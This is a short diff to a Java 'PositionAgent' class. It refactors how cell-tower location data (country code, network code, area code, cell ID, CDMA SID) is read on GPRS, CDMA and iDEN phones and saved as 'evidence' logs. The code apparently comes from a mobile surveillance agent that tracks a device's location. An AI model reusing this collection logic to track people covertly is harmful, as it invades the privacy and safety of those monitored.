@@ -246,9 +246,9 @@ public final class PositionAgent extends Agent implements LocationObserver {
 
     private void locationCELL() {
 
-        final boolean gprs = !Device.isCDMA();
+        //final boolean gprs = !Device.isCDMA();
 
-        if (gprs) {
+        if (Device.isGPRS()) {
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
             // http://en.wikipedia.org/wiki/Mobile_country_code
@@ -285,7 +285,7 @@ public final class PositionAgent extends Agent implements LocationObserver {
                 logCell.close();
             }
 
-        } else {
+        } else if(Device.isCDMA()){
             final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
             //CDMAInfo.getIMSI()
             final int sid = cellinfo.getSID();
@@ -313,6 +313,15 @@ public final class PositionAgent extends Agent implements LocationObserver {
                 saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                 logCell.close();
             }
+        }else if(Device.isIDEN()){
+            //TODO IDEN
+            //#ifdef DEBUG
+            debug.error("locationCELL: IDEN not supported");
+            //#endif
+        }else{
+            //#ifdef DEBUG
+            debug.error("locationCELL: not supported");
+            //#endif
         }
 
     }
